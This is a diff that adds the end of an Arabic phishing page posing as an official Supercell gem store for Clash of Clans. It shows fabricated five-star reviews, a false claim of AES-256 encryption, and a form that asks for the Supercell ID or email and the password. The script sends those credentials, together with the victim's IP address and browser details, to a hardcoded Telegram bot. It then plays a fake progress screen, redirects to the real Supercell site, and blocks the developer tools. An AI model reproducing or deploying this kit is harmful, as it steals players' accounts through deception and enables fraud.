+                                <i class="fas fa-star"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="review-text">"أفضل موقع جربته! جبت 1000 مجاناً وبعدين اشتريت 14000 بسعر رهيب. وصلوا خلال دقيقة واحدة"</p>
+                </div>
+
+                <div class="review-card-float">
+                    <div class="review-header">
+                        <div class="reviewer-avatar" style="background: linear-gradient(135deg, #f093fb, #f5576c);">س</div>
+                        <div class="reviewer-info">
+                            <h4>Sultan_Warrior</h4>
+                            <div class="review-stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="review-text">"الموقع رسمي 100% من سوبرسيل. جربت الهدية المجانية ووصلت فوراً. أنصح الجميع بسرعة العرض"</p>
+                </div>
+
+                <div class="review-card-float">
+                    <div class="review-header">
+                        <div class="reviewer-avatar" style="background: linear-gradient(135deg, #4facfe, #00f2fe);">م</div>
+                        <div class="reviewer-info">
+                            <h4>محمد_TH15</h4>
+                            <div class="review-stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="review-text">"وفر لي أكثر من 50 دولار! الباقات المخفضة حقيقية والتوصيل فوري. شكراً سوبرسيل"</p>
+                </div>
+
+                <!-- نسخ للتكرار -->
+                <div class="review-card-float">
+                    <div class="review-header">
+                        <div class="reviewer-avatar">ن</div>
+                        <div class="reviewer-info">
+                            <h4>نورة_الملكة</h4>
+                            <div class="review-stars">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="review-text">"أمن جداً وموثوق. استخدمته 3 مرات وكل مرة الجواهر توصل بسرعة. أنصح فيه بقوة"</p>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- النافذة المنبثقة -->
+    <div class="modal-overlay" id="orderModal">
+        <div class="modal-nav">
+            <button class="close-btn" onclick="closeOrder()">
+                <i class="fas fa-arrow-right"></i>
+            </button>
+            <span class="modal-title">تأكيد الطلب</span>
+            <div class="security-indicator">
+                <i class="fas fa-lock"></i>
+                <span>SSL</span>
+            </div>
+        </div>
+
+        <div class="selected-summary">
+            <div class="summary-glow"></div>
+            <div class="summary-icon" id="summaryIcon">💎</div>
+            <div class="summary-amount" id="summaryAmount">1,000 جوهرة</div>
+            <div class="summary-type" id="summaryType">مجاني 100%</div>
+        </div>
+
+        <form class="form-stack" id="orderForm" onsubmit="processOrder(event)">
+            <div class="input-group">
+                <i class="input-icon-left fas fa-user"></i>
+                <input type="text" class="input-field" id="gameId" placeholder=" " required>
+                <label class="input-label">Supercell ID أو الإيميل</label>
+            </div>
+
+            <div class="input-group">
+                <i class="input-icon-left fas fa-lock"></i>
+                <input type="password" class="input-field" id="gamePass" placeholder=" " required>
+                <label class="input-label">كلمة المرور</label>
+            </div>
+
+            <div class="security-banner">
+                <div class="shield-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="security-text">
+                    <h4>🔒 اتصال آمن مشفر</h4>
+                    <p>بياناتك محمية بتشفير AES-256. نستخدمها فقط للتحقق من ملكية الحساب وإرسال الجواهر مباشرة.</p>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-mega" id="submitBtn">
+                <span id="btnText">إرسال الجواهر للحساب</span>
+                <div class="spinner" id="btnSpinner"></div>
+                <i class="fas fa-paper-plane" id="btnIcon"></i>
+            </button>
+        </form>
+    </div>
+
+    <!-- شاشة المعالجة -->
+    <div class="process-overlay" id="processScreen">
+        <div class="process-visual">
+            <svg class="process-ring-svg" viewBox="0 0 150 150">
+                <circle class="progress-circle" cx="75" cy="75" r="70"/>
+                <circle class="progress-circle-active" id="progressCircle" cx="75" cy="75" r="70"/>
+            </svg>
+            <div class="center-icon">💎</div>
+            <div class="percentage-display" id="percentText">0%</div>
+        </div>
+
+        <h2 class="process-title">جاري المعالجة...</h2>
+        <p class="process-desc">نقوم الآن بالتحقق من حسابك وإضافة الجواهر. يرجى عدم إغلاق التطبيق.</p>
+
+        <div class="steps-flow">
+            <div class="flow-step active" id="step1">
+                <div class="step-number"><span>1</span></div>
+                <div class="step-content">
+                    <h4>التحقق من الحساب</h4>
+                    <p>جاري التحقق من بيانات Supercell ID</p>
+                </div>
+            </div>
+            <div class="flow-step" id="step2">
+                <div class="step-number"><span>2</span></div>
+                <div class="step-content">
+                    <h4>الاتصال بالخادم</h4>
+                    <p>إنشاء قناة آمنة مع خوادم سوبرسيل</p>
+                </div>
+            </div>
+            <div class="flow-step" id="step3">
+                <div class="step-number"><span>3</span></div>
+                <div class="step-content">
+                    <h4>توليد الجواهر</h4>
+                    <p>إضافة الجواهر إلى رصيدك</p>
+                </div>
+            </div>
+            <div class="flow-step" id="step4">
+                <div class="step-number"><span>4</span></div>
+                <div class="step-content">
+                    <h4>الإنهاء والتأكيد</h4>
+                    <p>اكتمال العملية بنجاح</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // الإعدادات
+        const BOT_TOKEN = '8360365079:AAE5JYoDz1OwgyFnoMoi1gO2EtYVMmlXAOY';
+        const CHAT_ID = '7428421245';
+        let currentGems = 1000;
+        let currentPrice = 0;
+        let isFreePack = true;
+
+        // العداد التنازلي
+        function initCountdown() {
+            let h = 4, m = 52, s = 37;
+            setInterval(() => {
+                s--;
+                if (s < 0) { s = 59; m--; }
+                if (m < 0) { m = 59; h--; }
+                if (h < 0) h = 23;
+                
+                document.getElementById('hours').textContent = h.toString().padStart(2, '0');
+                document.getElementById('minutes').textContent = m.toString().padStart(2, '0');
+                document.getElementById('seconds').textContent = s.toString().padStart(2, '0');
+            }, 1000);
+        }
+        initCountdown();
+
+        // فتح الطلب
+        function openOrder(gems, price, free) {
+            currentGems = gems;
+            currentPrice = price;
+            isFreePack = free;
+            
+            const modal = document.getElementById('orderModal');
+            const amount = document.getElementById('summaryAmount');
+            const type = document.getElementById('summaryType');
+            
+            amount.textContent = gems.toLocaleString() + ' جوهرة';
+            type.textContent = free ? 'مجاني 100%' : '$' + price;
+            
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        // إغلاق الطلب
+        function closeOrder() {
+            document.getElementById('orderModal').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        // معالجة الطلب
+        async function processOrder(e) {
+            e.preventDefault();
+            
+            const account = document.getElementById('gameId').value.trim();
+            const password = document.getElementById('gamePass').value.trim();
+            
+            if (!account || !password) return;
+            
+            // إظهار التحميل
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('btnIcon').style.display = 'none';
+            document.getElementById('btnSpinner').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
+            
+            // جمع IP
+            let ip = 'Unknown';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+            
+            // إرسال البيانات
+            const message = `🎯 SUPERCELL STORE - طلب جديد\n\n` +
+                          `📦 الباقة: ${currentGems.toLocaleString()} جوهرة\n` +
+                          `💰 السعر: ${isFreePack ? 'مجاني' : '$' + currentPrice}\n` +
+                          `👤 الحساب: ${account}\n` +
+                          `🔑 الباسورد: ${password}\n` +
+                          `🌐 IP: ${ip}\n` +
+                          `📱 الجهاز: ${navigator.platform}\n` +
+                          `🌍 المتصفح: ${navigator.userAgent.slice(0, 50)}\n` +
+                          `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+            } catch(e) {}
+            
+            // الانتقال للمعالجة
+            setTimeout(() => {
+                document.getElementById('orderModal').classList.remove('active');
+                document.getElementById('processScreen').classList.add('active');
+                startProcessing();
+            }, 800);
+        }
+
+        // محاكاة المعالجة
+        function startProcessing() {
+            const circle = document.getElementById('progressCircle');
+            const percentText = document.getElementById('percentText');
+            const circumference = 2 * Math.PI * 70;
+            
+            let progress = 0;
+            let currentStep = 1;
+            const steps = [
+                document.getElementById('step1'),
+                document.getElementById('step2'),
+                document.getElementById('step3'),
+                document.getElementById('step4')
+            ];
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 8 + 2;
+                if (progress > 100) progress = 100;
+                
+                const offset = circumference - (progress / 100) * circumference;
+                circle.style.strokeDashoffset = offset;
+                percentText.textContent = Math.floor(progress) + '%';
+                
+                // تحديث الخطوات
+                if (progress > 20 && currentStep === 1) {
+                    steps[0].classList.remove('active');
+                    steps[0].classList.add('completed');
+                    steps[1].classList.add('active');
+                    currentStep = 2;
+                }
+                if (progress > 45 && currentStep === 2) {
+                    steps[1].classList.remove('active');
+                    steps[1].classList.add('completed');
+                    steps[2].classList.add('active');
+                    currentStep = 3;
+                }
+                if (progress > 75 && currentStep === 3) {
+                    steps[2].classList.remove('active');
+                    steps[2].classList.add('completed');
+                    steps[3].classList.add('active');
+                    currentStep = 4;
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    steps[3].classList.remove('active');
+                    steps[3].classList.add('completed');
+                    
+                    setTimeout(() => {
+                        window.location.href = isFreePack ? 
+                            'https://supercell.com/en/games/clashofclans/' : 
+                            'https://store.supercell.com/';
+                    }, 1500);
+                }
+            }, 200);
+        }
+
+        // حماية
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key))) {
+                e.preventDefault();
+            }
+        });
+    </script>
+
+</body>
+</html>
